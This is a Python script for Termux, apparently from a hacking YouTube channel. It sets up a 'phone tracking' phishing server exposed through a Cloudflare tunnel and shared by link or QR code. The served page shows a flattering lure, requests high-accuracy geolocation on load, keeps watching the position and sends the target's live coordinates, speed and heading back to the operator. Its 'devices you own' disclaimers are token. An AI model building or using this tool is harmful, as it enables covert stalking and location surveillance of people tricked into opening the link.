#!/usr/bin/env python3

# HCO Track Phone by Azhar - FULL AUTO INSTALL + CLOUDFLARE
# IMPORTANT: Use this only on devices YOU OWN or with EXPLICIT CONSENT.

import os
import sys
import threading
import time
import re
import subprocess
from pathlib import Path

try:
    import requests
    from flask import Flask, request
except ImportError:
    print("Installing missing Python packages...")
    os.system('pkg install python wget -y')
    os.system('pip install flask requests qrcode[pil]')
    import requests
    from flask import Flask, request

# ---------------- Colors ----------------
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
RESET = "\033[0m"

app = Flask(__name__)
locations = {}

# ---------------- TOOL LOCK ----------------
def tool_lock():
    os.system("clear")
    print(f"{RED}╔{'═'*60}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(60)}║{RESET}")
    print(f"{RED}║{'HCO TRACK PHONE BY AZHAR'.center(60)}║{RESET}")
    print(f"{RED}║{'Subscribe @hackers_colony_tech 🔔'.center(60)}║{RESET}")
    print(f"{RED}╚{'═'*60}╝{RESET}\n")
    print(f"{YELLOW}This script is for testing on devices you own or where you have explicit permission.{RESET}\n")
    
    for i in range(9, 0, -1):
        sys.stdout.write(f"\r{CYAN}⏳ Redirecting in {i}...{RESET}")
        sys.stdout.flush()
        time.sleep(1)
    
    os.system('am start -a android.intent.action.VIEW -d "https://youtube.com/@hackers_colony_tech" > /dev/null 2>&1 || true')
    print(f"\n{GREEN}✅ Redirected to YouTube (if available).{RESET}\n")
    input(f"{YELLOW}Press ENTER to continue...{RESET}")

# ---------------- Dependencies ----------------
def install_requirements():
    print(f"{CYAN}Checking/attempting to install requirements...{RESET}")
    os.system('pkg update -y > /dev/null 2>&1 || true')
    os.system('pkg install python wget -y > /dev/null 2>&1 || true')
    os.system('pip install flask requests qrcode[pil] > /dev/null 2>&1 || true')

# ---------------- Cloudflared ----------------
def download_cloudflared():
    arch = subprocess.getoutput("uname -m")
    url = ""
    if arch == "aarch64":
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
    elif arch.startswith("arm"):
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm"
    elif arch in ["x86_64", "amd64"]:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    else:
        print(f"{RED}Unsupported CPU architecture: {arch}{RESET}")
        return False

    # Determine installation path
    if "com.termux" in os.environ.get("PREFIX", ""):
        path = Path(os.environ.get("PREFIX")) / "bin/cloudflared"
    else:
        path = Path("/usr/local/bin/cloudflared")
    
    if not path.exists():
        print(f"{CYAN}Downloading cloudflared for {arch}...{RESET}")
        os.system(f"wget -q {url} -O {path}")
        os.system(f"chmod +x {path}")
        print(f"{GREEN}✅ cloudflared installed at {path}{RESET}")
    return True

def start_cloudflared_tunnel(port=8080, timeout=15):
    # First make sure cloudflared is available
    if not download_cloudflared():
        return None, None
    
    # Determine cloudflared path
    if "com.termux" in os.environ.get("PREFIX", ""):
        cloudflared_path = Path(os.environ.get("PREFIX")) / "bin/cloudflared"
    else:
        cloudflared_path = Path("/usr/local/bin/cloudflared")
    
    cmd = [str(cloudflared_path), "tunnel", "--url", f"http://localhost:{port}"]
    
    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
    except Exception as e:
        print(f"{RED}Failed to start cloudflared: {e}{RESET}")
        return None, None

    url = None
    pattern = re.compile(r"https://[a-z0-9\-]+\.trycloudflare\.com", re.IGNORECASE)
    start = time.time()
    
    while time.time() - start < timeout:
        line = proc.stdout.readline()
        if not line:
            time.sleep(0.1)
            continue
        
        # Debug output
        print(f"{YELLOW}Cloudflared: {line.strip()}{RESET}")
        
        m = pattern.search(line)
        if m:
            url = m.group(0)
            break

    if url:
        threading.Thread(target=lambda p: p.wait(), args=(proc,), daemon=True).start()
        return url, proc
    
    try:
        proc.kill()
    except Exception:
        pass
    
    return None, None

def get_public_ip():
    try:
        r = requests.get("https://api.ipify.org", timeout=6)
        if r.status_code == 200:
            return r.text.strip()
    except Exception:
        return None

def create_public_url(port=8080):
    url, proc = start_cloudflared_tunnel(port=port, timeout=15)
    if url:
        print(f"{GREEN}✅ Cloudflare tunnel established: {url}{RESET}")
        return url
    
    print(f"{YELLOW}⚠️  Cloudflare tunnel failed, trying public IP...{RESET}")
    ip = get_public_ip()
    if ip:
        print(f"{GREEN}✅ Using public IP: {ip}{RESET}")
        return f"http://{ip}:{port}"
    
    print(f"{YELLOW}⚠️  Could not determine public IP, using localhost{RESET}")
    return f"http://localhost:{port}"

# ---------------- Flask endpoints ----------------
@app.route("/")
def index():
    return """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HCO Track Phone</title>
    <style>
        body {
            background: #000;
            color: #0f0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            font-size: 18px;
            margin: 0;
            padding: 20px;
            text-align: center;
        }
        .message {
            margin-bottom: 20px;
        }
        .coords {
            margin-top: 20px;
            font-size: 16px;
            color: #0ff;
        }
    </style>
</head>
<body>
    <div class="message">You are a great person 😁</div>
    <div id="status">Requesting location access...</div>
    <div id="coords" class="coords"></div>

    <script>
        function onSuccess(pos) {
            try {
                document.getElementById('status').innerHTML = 'Location access granted!';
                const coordsDiv = document.getElementById('coords');
                coordsDiv.innerHTML = `Lat: ${pos.coords.latitude.toFixed(6)}<br>Lon: ${pos.coords.longitude.toFixed(6)}<br>Accuracy: ${pos.coords.accuracy}m`;
                
                fetch('/update', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        lat: pos.coords.latitude,
                        lon: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        heading: pos.coords.heading || null,
                        speed: pos.coords.speed || null,
                        timestamp: pos.timestamp
                    })
                }).catch(err => console.error('Error:', err));
            } catch(e) {
                console.error('Error:', e);
            }
        }
        
        function onError(err) {
            document.getElementById('status').innerHTML = `Error: ${err.message}`;
            console.error('Geolocation error:', err);
        }
        
        function requestLocation() {
            if (navigator.geolocation) {
                // First try to get current position
                navigator.geolocation.getCurrentPosition(onSuccess, onError, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
                
                // Then watch for updates
                navigator.geolocation.watchPosition(onSuccess, onError, {
                    enableHighAccuracy: true,
                    maximumAge: 3000,
                    timeout: 10000
                });
            } else {
                document.getElementById('status').innerHTML = 'Geolocation is not supported by this browser.';
            }
        }
        
        // Request location on page load
        window.onload = requestLocation;
    </script>
</body>
</html>
"""

@app.route("/update", methods=["POST"])
def update():
    try:
        data = request.get_json(force=True)
    except Exception:
        return "BAD", 400
    
    if not data or "lat" not in data or "lon" not in data:
        return "INVALID", 400

    data["time"] = time.time()
    locations.clear()
    locations.update(data)
    
    lat = data.get("lat")
    lon = data.get("lon")
    acc = data.get("accuracy", "N/A")
    
    print(f"\n{GREEN}✅ LIVE LOCATION RECEIVED{RESET}")
    print(f"{CYAN}Latitude: {lat}{RESET}")
    print(f"{CYAN}Longitude: {lon}{RESET}")
    print(f"{CYAN}Accuracy: {acc} m{RESET}")
    print(f"{CYAN}Maps: https://maps.google.com/?q={lat},{lon}{RESET}\n")
    
    return "OK", 200

# ---------------- QR helper ----------------
def make_qr(url):
    try:
        import qrcode
        out = Path("track_qr.png")
        img = qrcode.make(url)
        img.save(out)
        os.system(f"termux-open {out} > /dev/null 2>&1 || xdg-open {out} > /dev/null 2>&1 || true")
    except Exception as e:
        print(f"{YELLOW}⚠️  Could not generate QR code: {e}{RESET}")

# ---------------- Server ----------------
def start_server(port=8080):
    threading.Thread(target=lambda: app.run(
        host="0.0.0.0", 
        port=port, 
        debug=False, 
        use_reloader=False
    ), daemon=True).start()
    time.sleep(2)  # Give server time to start

# ---------------- Main ----------------
def main():
    tool_lock()
    install_requirements()
    os.system("clear")
    print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")

    port = 8080
    public_url = create_public_url(port=port)
    start_server(port)
    make_qr(public_url)
    
    print(f"\n{GREEN}{'='*60}{RESET}")
    print(f"{GREEN}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
    print(f"{GREEN}{'='*60}{RESET}")
    print(f"{YELLOW}Public URL: {RESET}{public_url}\n")
    print(f"{YELLOW}Share the link or QR with the user (test on devices you own).{RESET}")
    print(f"{YELLOW}Waiting for live location updates... (Ctrl+C to stop){RESET}")
    
    last_time = 0
    try:
        while True:
            if locations.get("time", 0) > last_time:
                last_time = locations["time"]
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 Stopped by user{RESET}")

if __name__ == "__main__":
    main()
